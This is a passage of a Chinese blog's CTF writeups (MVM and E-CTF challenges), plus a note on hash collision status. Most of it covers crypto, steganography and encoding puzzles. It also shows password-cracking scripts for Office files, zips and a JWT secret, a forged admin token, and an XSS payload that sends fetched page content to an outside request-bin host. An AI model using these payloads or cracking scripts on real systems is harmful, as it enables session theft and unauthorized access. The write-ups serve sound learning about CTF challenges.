VMMVMVMVVMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVVVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVMMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVMVVMVMMVMVVVMMMVMVMVVMMVMVMVVMVMVVMVVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMVMVVMVVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVMVVMMVMVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVMVVMMVMVVVMMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVMVMMVMVVVMMMVVVVVMMMVMVVMVMMVMVVMVMVMVVMVVMMVMVVMVMMVMVVMVMMVVVVVMMMVMVMVVMMVMVMVVMMVMVMVVMMVVVVMMMVMVVVMVMMVVVVVMMMVMVVVM 跟之前一样，将其转成二进制再解码会得到 1++[----------&gt;+&lt;]&gt;.+++++++++.---------.-[-&gt;+++++&lt;]&gt;-.+[-----&gt;+&lt;]&gt;+.+++++++++.---------.-[----&gt;+++++&lt;]&gt;.+[---&gt;++&lt;]&gt;++.&gt;-[---&gt;+&lt;]&gt;---.--[-&gt;++++&lt;]&gt;+.++++++++.+++++.[--&gt;+++++++++&lt;]&gt;.[---&gt;+++++&lt;]&gt;.++++++++++.++++++++++++.-[-----&gt;+&lt;]&gt;.&gt;-[---&gt;+&lt;]&gt;.-[-----&gt;+&lt;]&gt;-.++++++++.------.-.++[-&gt;+++++&lt;]&gt;+.[-----&gt;++++&lt;]&gt;+.+++++++++.---------.&gt;--[--&gt;+++&lt;]&gt;. 很显然这是Brainfuck,所以找个在线的intepreter运行一下就可以得到flag： MVM{MVM_BRAIN_IS_FUCKED_MVM} count-the-mvms主要是数背景的mvm个数，发现它们的像素点是一样的。所以写个图像匹配脚本即可. 首先要把pdf转换成 png，推荐 adobe acrobat 123456789101112131415161718192021222324252627282930313233343536import cvlib# cvlib 是自己写的库im = cvlib.read_img(&quot;certificate_h4tum.png&quot;)sim = cvlib.subrectimg(im, 605, 516, 837, 665)sim2 = cvlib.subrectimg(sim, 44, 32, 79, 48)mvm = cvlib.subrectimg(sim2, 2, 2, 32, 13)print(&quot;read success&quot;)def match(im, x,y): if x+len(mvm) &gt; len(im): return False if y+len(mvm[0]) &gt; len(im[0]): return False for i in range(len(mvm)): for j in range(len(mvm[i])): [r,g,b] = mvm[i][j] [ri,gi,bi] = im[x+i][y+j] if r != ri or g != gi or b != bi: return False return True def count_matches(im): cnt = 0 for i in range(len(im)): print(i) for j in range(len(im[i])): if match(im, i,j): cnt += 1 j += len(mvm[0]) - 1 return cntprint(count_matches(im))print(&quot;finish&quot;) Cryptoman-vs-matrix:题目描述： 打开下载文件会看到： 1234567891011121314151617181920212223242526272829303132from sage.all import *from Crypto.Util.number import bytes_to_longclass RNG: def __init__(self, seed): self.p = next_prime(2**24) # 16777259 self.F = GF(self.p) self.M = matrix(self.F, 3,3, [bytes_to_long(seed[i:i+3]) for i in range(0, len(seed), 3)]) self.state = vector(self.F, map(ord, &quot;Mvm&quot;)) # [77, 118, 109] self.gen = self.F(2) def get_random_num(self): out = self.M * self.state for i in range(len(self.state)): # len = 3 self.state[i] = self.gen**self.state[i] return out * self.stateflag = b&quot;MVM&#123;???????????????????????????&#125;&quot;seed = flag[4:-1] # 27位，27/3=9rng = RNG(seed)samples = []for i in range(9): samples.append(rng.get_random_num())print(f&quot;&#123;samples = &#125;&quot;)# samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781] 是几个随机数的生成器（RNG），但生成逻辑非常简单。 每次会计算 (\\text{M} \\cdot \\text{state}) \\cdot \\text{new\\_state}(括号外的乘法是内积。在sage里，矩阵与矩阵/向量的乘法和向量与向量的内积都是用*)。并且有 \\text{new\\_state}[i] = 2^{\\text{state}[i]}.这里的初始state是已知的，所以我们只需要建立一个9元1次线性方程组即可。 我们可以写一段sagemath的代码来通过解方程逆推出matrix以及flag内容： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162p = 16777259 # = next_prime(2**24)F = GF(p)samples = [6192533, 82371, 86024, 4218430, 12259879, 16442850, 6736271, 7418630, 15483781]# 初始状态 S0 = [77, 118, 109]S0 = vector(F, [77, 118, 109])def next_state(st): return vector(F, [F(2)^int(x) for x in st])# 求出 S0 ~ S9S = [None]*10S[0] = S0for i in range(1, 10): S[i] = next_state(S[i-1])# 构造线性方程组 X * M_vec = YX = matrix(F, 9, 9)Y = vector(F, 9)for i in range(9): row_coeffs = [] # M_vec 的顺序: M[0,0], M[0,1], M[0,2], M[1,0], ..., M[2,2] for k in range(3): for j in range(3): row_coeffs.append(S[i][j] * S[i+1][k]) X[i] = row_coeffs Y[i] = samples[i]# 求解 9 个未知量M_vec = X.solve_right(Y)M_mat = matrix(F, 3, 3, M_vec)print(&quot;Recovered M =&quot;)print(M_mat)# 将 3x3 矩阵以行优先顺序（row-major）展开成 9 个元素# 对应当初 [bytes_to_long(seed[0:3]), bytes_to_long(seed[3:6]), ..., bytes_to_long(seed[24:27])]m_ints = []for i in range(3): for j in range(3): # Sage 返回的是 GF(p) 的元素，先转成普通整型 val = int(M_mat[i, j]) m_ints.append(val)# 将每个 val 转成 3 字节后依次拼接seed_recovered = b&quot;&quot;.join(val.to_bytes(3, &quot;big&quot;) for val in m_ints)# 最终还原 flag = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;flag_recovered = b&quot;MVM&#123;&quot; + seed_recovered + b&quot;&#125;&quot;print(&quot;Recovered seed =&quot;, seed_recovered)print(&quot;Recovered flag =&quot;, flag_recovered)#最后得到的结果：# Recovered M =# [7090542 3355762 6252149]# [5137236 3223662 3497780]# [7484255 7174495 6698102]# Recovered seed = b&#x27;l1n34r_fuNcT10n5_4r3_my_f4v&#x27;# Recovered flag = b&#x27;MVM&#123;l1n34r_fuNcT10n5_4r3_my_f4v&#125;&#x27;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"比赛Writeup","slug":"CTF/比赛Writeup","permalink":"https://archer-baiyi.github.io/en/categories/CTF/%E6%AF%94%E8%B5%9BWriteup/"}],"tags":[{"name":"writeup","slug":"writeup","permalink":"https://archer-baiyi.github.io/en/tags/writeup/"}]},{"title":"哈希加密的长度与碰撞情况","slug":"CTF/Crypto/哈希加密的长度与碰撞情况","date":"2025-03-09T18:36:57.000Z","updated":"2025-03-29T18:54:16.080Z","comments":true,"path":"2025/03/09/CTF/Crypto/哈希加密的长度与碰撞情况/","permalink":"https://archer-baiyi.github.io/en/2025/03/09/CTF/Crypto/%E5%93%88%E5%B8%8C%E5%8A%A0%E5%AF%86%E7%9A%84%E9%95%BF%E5%BA%A6%E4%B8%8E%E7%A2%B0%E6%92%9E%E6%83%85%E5%86%B5/","excerpt":"常见的哈希函数的长度及其碰撞情况汇总","text":"以下是各种常见的哈希函数的长度及其碰撞情况汇总： 哈希长度 (bit) 常见算法 碰撞情况 碰撞年份 发明年份 状态 128-bit MD5 存在已知有效碰撞攻击 2004 年 1992 年 已过时，不推荐使用 160-bit SHA-0, SHA-1, RIPEMD-160 SHA-0: 存在已知有效碰撞攻击 SHA-0: 2004 年 SHA-0: 1993 年 SHA-0: 已弃用，不推荐使用 SHA-1: 存在已知有效碰撞攻击 SHA-1: 2017 年 SHA-1: 1995 年 已过时，不推荐使用 256-bit SHA-256, SHA-3-256 暂无已知有效碰撞攻击 - SHA-256: 2001 年 安全，广泛使用 384-bit SHA-384 暂无已知有效碰撞攻击 - 2001 年 安全，高安全性需求 512-bit SHA-512, SHA-3-512 暂无已知有效碰撞攻击 - SHA-512: 2001 年 非常安全，高性能需求 碰撞情况说明 128-bit (MD5): MD5 是一种输出为 128 位的哈希算法，但由于其设计的安全性不足，早在 2004 年就被发现可以有效制造碰撞。 MD5 于 1992 年被发明，不适合任何需要密码学安全性的场景，仅可用于低安全性完整性校验。 160-bit (SHA-0, SHA-1, RIPEMD-160): SHA-0 是 SHA 系列的初代版本，存在严重的设计缺陷，在 2004 年被证明可以制造碰撞。SHA-0 于 1993 年发明。 SHA-1 作为输出 160 位的主流算法，在 2017 年被证实可以通过理论和实践攻击制造碰撞。SHA-1 于 1995 年发明。 RIPEMD-160 虽尚未有公开的碰撞记录，但不如更高位算法安全。 256-bit (SHA-256, SHA-3-256): 目前没有已知的碰撞攻击。 SHA-256 于 2001 年被发明，适合绝大多数场景，如数字签名、区块链和数据完整性验证。 384-bit (SHA-384): 为高安全需求设计，未有任何已知的碰撞攻击。 SHA-384 于 2001 年发明，适用于密钥交换、长时间数据存储等高安全性应用。 512-bit (SHA-512, SHA-3-512): 提供极高的安全性，特别适用于对抗潜在的量子计算威胁。 SHA-512 于 2001 年发明，性能消耗较高，适合长期存储的场景。","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Crypto","slug":"CTF/Crypto","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Crypto/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/tags/CTF/"},{"name":"哈希","slug":"哈希","permalink":"https://archer-baiyi.github.io/en/tags/%E5%93%88%E5%B8%8C/"},{"name":"Hash","slug":"Hash","permalink":"https://archer-baiyi.github.io/en/tags/Hash/"}]},{"title":"E-CTF比赛 Writeup","slug":"CTF/比赛Writeup/E-CTF-Writeup","date":"2025-03-02T23:17:07.000Z","updated":"2025-11-29T21:38:41.272Z","comments":true,"path":"2025/03/03/CTF/比赛Writeup/E-CTF-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/03/03/CTF/%E6%AF%94%E8%B5%9BWriteup/E-CTF-Writeup/","excerpt":"E-CTF比赛的题解，涉及方向：Crypto, Web, Steg, Misc, Forensics, Osint","text":"1. Cryptography（密码学）ASCII me anything but not the flag 根据它的提示，我们先将这段内容用ASCII解码，得到： 123456789108 100 111 109 123 85 99 49 122 95 106 53 95 79 111 51 95 88 52 116 95 48 109 95 51 111 88 121 90 107 97 106 48 105 125 10 10 69 98 111 98 32 102 112 32 118 108 114 111 32 104 98 118 44 32 100 108 108 97 32 105 114 122 104 32 58 32 72 66 86 72 66 86 10 10 87 101 108 108 32 100 111 110 101 44 32 98 117 116 32 110 111 119 32 100 111 32 121 111 117 32 107 110 111 119 32 97 98 111 117 116 32 116 104 101 32 103 117 121 32 119 104 111 32 103 111 116 32 115 116 97 98 98 101 100 32 50 51 32 116 105 109 101 115 32 63-&gt;ldom&#123;Uc1z_j5_Oo3_X4t_0m_3oXyZkaj0i&#125;Ebob fp vlro hbv, dlla irzh : HBVHBVWell done, but now do you know about the guy who got stabbed 23 times ? 第三段的指的是凯撒大帝被刺杀的事件： 所以我们尝试遍历前两段的凯撒加密结果，但只有第二段可以得到有用信息： 1Here is your key, good luck : KEYKEY 可以得知密钥为：”HBVHBV“（我一开始以为密码就是KEYKEY）。由于第一段括号前的内容为4个字母，刚好对的上”ectf“，所以应该是单表或者多表替换加密。再因为密钥为重复的内容，不难猜测这应该是“Vigenere 维吉尼亚密码”。于是找个在线的解密网页（https://planetcalc.com/2468/#google_vignette）便可以得到flag： 1ectf&#123;th1s_i5_th3_w4y_0f_3ncrypti0n&#125; OIIAIOIIIAI 😼 由于知道这次比赛的flag格式为ectf{}，所以不难发现这串字符的偶数位应该是flag的开头，也就是： 1ectf&#123;y0U_5p1N_M3 而由于}在字符串开头，所以猜测基数位的倒序为flag的后半部分： 1R1GhT_R0unD_B4bY&#125; 拼在一起得到flag： 1ectf&#123;y0U_5p1N_M3_R1GhT_R0unD_B4bY&#125; Hashes Binder 首先会下载得到3个文件： 由于这份Excel文件被设置了密码保护，所以我们尝试用这个wordlist里的内容来爆破它： 1234567891011121314151617181920212223import msoffcryptoimport ioencrypted_file = &quot;parts.xlsx&quot; password_list = &quot;wordlist.txt&quot; with open(password_list, &quot;r&quot;, encoding=&quot;utf-8&quot;) as f: passwords = [line.strip() for line in f.readlines()]for password in passwords: try: with open(encrypted_file, &quot;rb&quot;) as file: office_file = msoffcrypto.OfficeFile(file) office_file.load_key(password=password) decrypted_file = io.BytesIO() office_file.decrypt(decrypted_file) print(f&quot;成功破解密码: &#123;password&#125;&quot;) break except Exception: continue# 成功破解密码: dolphin 打开Excel文件后会看到3部分内容 123456789Part 1036074c2585230c1ad9e6b654a1671ac13ee856eb505f44346593e1748a6a52aPart 22H8ZcpmQyRisnPart 3cHJlc2NyaXB0aW9u 首先注意到第2，3部分非常像base64编码内容，于是尝试解码，第三部分会成功解出来： 1prescription 第二部分则提示解码失败，所以我们尝试其他base解码，最后用base58成功解码得到： 1digestive 第一部分则非常像哈希加密的结果，所以我们用这个网站试一下能不能破解 https://hashes.com/en/decrypt/hash 提示破解成功，原文为spooky，并且使用的算法是Gost Hash。（spooky其实也在这个wordlist.txt里，所以理论上来说这一步也可以用爆破得到。） 于是用 1dolphin_spooky_digestive_prescription 成功解压.zip压缩包得到flag： 1ECTF&#123;J0nH_tH3_Cr4ck3R_95234826&#125; RSA intro 这道题我们会得到以下内容： 1234n = 1184757578872726401875541948122658312538049254193811194706693679652903378440466755792536161053191231432973156335040510349121778456628168943028766026325269453310699198719079556693102485413885649073042144349442001704335216057511775363148519784811675479570531670763418634378774880394019792620389776531074083392140830437849497447329664549296428813777546855940919082901504207170768426813757805483319503728328687467699567371168782338826298888423104758901089557046371665629255777197328691825066749074347103563098441361558833400318385188377678083115037778182654607468940072820501076215527837271902427707151244226579090790964814802124666768804586924537209470827885832840263287617652116022064863681106011820233657970964986092799261540575771674176693421056457946384672759579487892764356140012868139174882562700663398653410810939857286089056807943991134484292518274473171647231470366805379774254724269612848224383658855657086251162811678080812135302264683778545807214278668333366983221748107612374568726991332801566415332661851729896598399859186545014999769601615937310266497300349207439222706313193098254004197684614395013043216709335205659801602035088735521560206321305834999363607988482888525092210585343868702766655032190348593070756595867719633492847013620378010952424253098519859359544101947494405255181048550165119679168071637363387551385352023888031983210940358096667928019837327581681936262186049576626435407253113152851511562799379477905913074052917135254673527350886619693800827592241738185465519368503599267554966329609741719839452532720121891782656000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001e = 65537c = 393830705821083872264416484945379590743951209334251680140561629963083955435155434968501995173717065691853716117413549060471633713246813706134614822460487831949312719410922980049951577395596254279195364667821988767675462852220254638390252652391863031378262058213973374365653466528787640726441241664538814924465041415751207617994829099967542528845558372954608772395722055861369383117996161988362298650918468621344968162697585757444815069821774651095279049590140325395770490299618719676066106689396243767847620065054763147901166291755102218540290732819710294120101688593205036339603152228827861450774360237006971191234350634731104643779249017990427055169232234892324512234471025984131134122883594190002695857381320761826426970820621555957081409595866374650139218172798735536295519361258955868218458841069870611367807353745731928726480481254620623949030522228724677423429285228917983167742866068764059333196595815029550909470984427785123479796787934189869159245455191142352654087327876642690754428041545205764160668875253155015956045237338532248073834631989395905208181116526111301051883717335829373670674970007067708289628731972707477338551521585672558157829354894929466723788269911067380887281008564055766243843557738727000164255990684153972958815292767702154995098383096546576559199090417518282978657504210433584144451378874050676287588884988934683793378300065910040270282398699691108573435112129408980056605713259535036581461672565785674329469547540861581715756111296028940885214170609934085009608200810707122173370006290459841638659407675519141544675968270051746963709729460531469035621873301953785282870733516854080405064440750450304537433849449545664331761838457477121677018421695909336075840076436991397964264703526101810961378256559625011198775706699 因为没有其他信息了，所以我们先用 http://www.factordb.com/index.php 试一下暴力分解n： 成功得到n的其中一个因数为5054843。之后就只需要写一段代码解密就可以得到flag： 123456789101112131415from Crypto.Util.number import inverse, long_to_bytesdef rsa_decrypt(n, e, c, p): q = n // p phi_n = (p - 1) * (q - 1) d = inverse(e, phi_n) m = pow(c, d, n) return long_to_bytes(m).decode(&#x27;utf-8&#x27;)n = e = 65537c = p = 5054843 plaintext = rsa_decrypt(n, e, c, p)print(&quot;解密结果:&quot;, plaintext)# 解密结果: ectf&#123;b4sic_F4cT0rDb_rS4&#125; Cracking the Vault 这道题我们会得到2份文件，一份是python的代码，关于加密算法的，另一份文件则是加密后的结果。 我们首先来看一下加密的具体过程： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import secretsimport hashlibdef encryption(text): encrypted = [] random = secrets.SystemRandom() padding_length = 256 - len(text) % 256 raw_padding = [chr(random.randint(32, 126)) for _ in range(padding_length)] scrambled_padding = [chr((ord(c) * 3 + 7) % 94 + 32) for c in raw_padding] shifted_padding = scrambled_padding[::-1] padded_text = &#x27;&#x27;.join(shifted_padding) + text final_padded_text = &#x27;&#x27;.join( chr((ord(c) ^ 42) % 94 + 32) if i % 2 == 0 else c for i, c in enumerate(padded_text) ) secret_key = str(sum(ord(c) for c in text)) secret_key = secret_key[::-1] hashed_key = hashlib.sha256(secret_key.encode()).hexdigest() seed = int(hashed_key[:16], 16) random = secrets.SystemRandom(seed) for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seedwith open(&#x27;VaultKey.txt&#x27;, &#x27;r&#x27;) as f: text = f.read()encrypted_text, seed = encryption(text)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;w&#x27;) as f: f.write(encrypted_text)print(&quot;The file has been successfully encrypted!&quot;) 我们可以注意到这段代码里有很多多余的内容（指没有真正出现在加密过程中），真正跟加密算法相关的其实只有这一段 1234567for i, char in enumerate(text): char_code = ord(char) shift = (i + 1) * 3 transformed = (char_code + shift + 67) % 256 encrypted.append(chr(transformed)) return &#x27;&#x27;.join(encrypted), seed 所以我们只需要逆向一下这个加密逻辑便可以得到flag： 123456789101112131415def decryption(encrypted_text): decrypted_chars = [] for i, enc_char in enumerate(encrypted_text): enc_code = ord(enc_char) shift = 3 * (i + 1) + 67 orig_code = (enc_code - shift) % 256 decrypted_chars.append(chr(orig_code)) return &#x27;&#x27;.join(decrypted_chars)with open(&#x27;VaultKey_encrypted.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;, errors=&#x27;ignore&#x27;) as f: encrypted_text = f.read()print(decryption(encrypted_text))# Well done! I bet you&#x27;re great at math. Here&#x27;s your flag, buddy: ectf&#123;1t_W45_ju5T_4_m1nu5&#125; Never two without three 我们首先会得到这些内容： 1AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY 直接尝试base64解码会提示失败，所以根据它的提示我们先遍历它的所有凯撒加密然后再解码： 12345678910111213141516171819202122232425262728293031import base64import stringdef caesar_cipher_decrypt(text, shift): decrypted_text = &quot;&quot; for char in text: if char in string.ascii_letters: is_upper = char.isupper() alphabet = string.ascii_uppercase if is_upper else string.ascii_lowercase new_index = (alphabet.index(char) - shift) % 26 decrypted_text += alphabet[new_index] else: decrypted_text += char return decrypted_textdef try_base64_decode(text): try: decoded_data = base64.b64decode(text).decode(&#x27;utf-8&#x27;) return decoded_data except Exception: return Nonecipher_text = &quot;AEBvoE14n2JjDEhaEO5eAGnEFGdXluF2FNJxC01jXNPQX3PVl3T5oOm4DQrVXFXJGDBxEudVC3E5Xuh0oFzY&quot;for shift in range(26): decrypted_text = caesar_cipher_decrypt(cipher_text, shift) base64_decoded = try_base64_decode(decrypted_text) if base64_decoded: print(f&quot;Shift: &#123;shift&#125;, 解码: &#123;base64_decoded&#125;&quot;)# Shift: 10, 解码: ADeyMxwfsMLjPNnAgTUkMnEvT6gKMs41F7qKoryxG8LhK5SYY4gRKKKu96LtyZN 发现这是唯一可以成功解码出来的内容。我们再次尝试用base64解码这段内容会提示失败，所以还是转战其他的base编码，最后再次用base58成功解码得到： 1The flag is: ectf&#123;D0_u_l0v3_t4e_crypt0grap413&#125; 2. WebJava Weak Token 先简单科普一下JWT： JWT是一串base64编码，被用.分成3部分。第一部分是header，里面会写使用的算法以及typ（一般都是JWT）。第二部分是Payload，是JWT的核心内容，通常会纪录当前JWT所有者的身份信息。第三部分则是签名，会计算 1HMACSHA256(base64UrlEncode(header) + &quot;.&quot; +base64UrlEncode(payload),密钥) 以确保当前信息的完整性（integrity），真实性（authenticity）。 在这道题我们会首先在目标网站里得到我们的JWT（我们每次访问网站都会得到一个新的JWT）： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM 用 https://jwt.io/ 分析一下： 可以看到，Payload里有一个名为”username“的值当前被设置为“user”，我们猜测只需要将其改成“admin”并且用其再次访问网站即可获得flag。 根据题目的提示，我们先将这个JWT的密钥给爆破出来： 1234567891011121314151617181920212223242526272829import jwtimport timedef brute_force_jwt(token): # header, payload, signature = token.split(&#x27;.&#x27;) with open(&quot;rockyou.txt&quot;, &#x27;r&#x27;, encoding=&#x27;latin-1&#x27;) as f: for line in f: secret = line.strip() try: decoded = jwt.decode(token, secret, algorithms=[&#x27;HS256&#x27;]) print(f&quot;[+] Found secret key: &#123;secret&#125;&quot;) print(f&quot;Decoded JWT: &#123;decoded&#125;&quot;) return secret except jwt.ExpiredSignatureError: print(f&quot;[-] Expired token with key: &#123;secret&#125;&quot;) return secret except jwt.InvalidTokenError: pass print(&quot;[-] No valid secret found in wordlist.&quot;) return Nonejwt_token = &quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6InVzZXIiLCJleHAiOjE3MzgzNTcwMDV9.0dmdQRyyCngN1JJTVoVVk5WYqz0I44yBvWHyUEMXTzM&quot;brute_force_jwt(jwt_token)# [+] Found secret key: 1234 用这个网站将我们的JWT的payload改成“admin” 之后再用这个新的JWT访问网站即可得到flag： 1ectf&#123;JwT_T0keN_cR34t0r&#125; Chat with the admin 这道题比较明显地暗示了我们需要用xss攻击来获取flag。我们首先在 https://pipedream.com/ 创建一个Request Bin（创建临时的 HTTP 端点，用于捕获和检查传入的 HTTP 请求。）， 然后在对话框里输入以下内容即可： 1&lt;script&gt;fetch(&#x27;http://instances.ectf.fr:11111/&#x27;).then(response =&gt; response.text()).then(text =&gt; document.location=&quot;https://xxxxxxxxxxxx.m.pipedream.net?flag=&quot;+btoa(encodeURIComponent(text)))&lt;/script&gt; 之后便会在Request Bin的访问纪录里查看flag： 1ECTF&#123;Cook13_st0L3n_5ucc3ssfuLLy&#125; 3. Steganography（隐写）Definitely not in the PDF 将下载的压缩包解压会得到一份pdf文件： /Stega_-_Definitely_not_in_the_PDF/world_flags.jpg) 并没有任何发现，再根据他一直说的“flag”不在这里，于是决定去看一开始的压缩包。果然在文件结尾发现flag： 1ECTF&#123;W3lL_d0nE_652651663616263&#125; JB1804 我们会得到一份乐谱： 通过检查发现它并没有隐写任何内容在hex文件里，抑或是LSB隐写。 通过谷歌搜索“music Steganography 1804”可以发现这个维基词条： 点进去之后搜索“1804”会发现Johann Bücking在1804年发明了一种乐谱密码： 根据这张密码表解码会得到： 1ectf&#123;steganomousiqueissuperswag&#125; (法语中的“音乐“是”musique“，所以flag的内容为stegano mousique is super swag。) The island’s treasure 下载文件会得到2张图片： 首先用010 Editor打开第一张图片会发现 在Description后面有一段base64编码 1UnNPcGJHbGphWFJoZEdsdmJuTWdJU0JVZFNCaGN5QjBjbTkxZHNPcElHeGhJR05zdzZrZ2JzS3dNU0JrZFNCamIyWm1jbVVnSVEwS1EyOXVaM0poZEhWc1lYUnBiMjV6SUNFZ1dXOTFJR1p2ZFc1a0lIUm9aU0JyWlhrZ2JzS3dNU0J2WmlCMGFHVWdZMmhsYzNRZ0lRMEtRMnpEcVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTU5Da3RsZVRvZ1RUTjBOR1EwZERSZk1UVmZiakIwWHpWaFpqTT0= 解码后会得到 1RsOpbGljaXRhdGlvbnMgISBUdSBhcyB0cm91dsOpIGxhIGNsw6kgbsKwMSBkdSBjb2ZmcmUgIQ0KQ29uZ3JhdHVsYXRpb25zICEgWW91IGZvdW5kIHRoZSBrZXkgbsKwMSBvZiB0aGUgY2hlc3QgIQ0KQ2zDqTogTTN0NGQ0dDRfMTVfbjB0XzVhZjMNCktleTogTTN0NGQ0dDRfMTVfbjB0XzVhZjM= 再解码一次会得到key1： 1234Félicitations ! Tu as trouvé la clé n°1 du coffre !Congratulations ! You found the key n°1 of the chest !Clé: M3t4d4t4_15_n0t_5af3Key: M3t4d4t4_15_n0t_5af3 因为hex文件里面看起来找不到第二段key了，所以我们用Stegsolve.jar打开这张图片查看是否有用LSB隐写的内容。当调整到Red Plane 0时会得到 我们将这张照片导出会得到第二部分的key（key2）： 123key1: M3t4d4t4_15_n0t_5af3key2: Hidd3n_p1ctur3key = key1:key2 = M3t4d4t4_15_n0t_5af3:Hidd3n_p1ctur3 然后我们现在来打开箱子：根据提示，支持加密隐写并且有GUI的软件并不多，所以我们来试一下OpenStego： 提取出来的照片为： 成功找到flag： 1ECTF&#123;You_found_th3_tr3asur3&#125; Silhouette in cyberpunk 这道题我们会得到一张图片： 非常赛博风。 注意到这两个地方的点组的排列非常像我们日常生活中（比如说电梯里）会碰到的盲文： （近点的那栋大楼） （画面左边远处的那栋大楼） 第一张里面的盲文翻译过来是： 1This is just a dummyy, nice try 而第二张里面的内容才是真正的flag： 12345⠓⠼⠁⠙⠙⠼⠉⠝⠼⠁⠝⠹⠼⠉⠙⠼⠙⠗⠅⠝⠼⠉⠎⠎-&gt;h1dd3n1nth3d4rkn3ss (可以用这个网站翻译盲文内容：https://www.dcode.fr/alphabet-braille) 根据题目的flag格式要求，我们确定flag为： 1ectf&#123;h1dd3n_1n_th3_d4rkn3ss&#125; 4. MiscellaneousExtraction Mission Heart of the vault 这道题我们会得到一个加密的压缩包Misc_5_-_dwarf_vault_200.zip，将其爆破之后会再次得到一个加密的压缩包dwarf_vault_199.zip，再重复一次操作会得到dwarf_vault_198.zip，也是加密了的。所以我们猜测作者将一份文件（夹）重复加密压缩了200次。所以决定写一个脚本自动化完成这些操作，并且根据提示将所有密码保存进一个txt文件里： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import zipfileimport osimport shutilimport zlib# 定义初始zip文件路径和字典文件路径zip_path = &quot;Misc_5_-_dwarf_vault_200.zip&quot;dict_path = &quot;rockyou.txt&quot;passwords = [] # 记录所有找到的密码def brute_force_zip(zip_path, dict_path): try: with zipfile.ZipFile(zip_path, &#x27;r&#x27;) as zip_file: with open(dict_path, &quot;r&quot;, encoding=&quot;latin-1&quot;) as f: for line in f: password = line.strip().encode(&quot;latin-1&quot;) # 转换为字节格式 try: zip_file.extractall(pwd=password) print(f&quot;[+] 找到密码: &#123;password.decode()&#125;&quot;) passwords.append(password.decode()) # 获取解压后的文件夹或文件名 extracted_files = zip_file.namelist() return extracted_files # 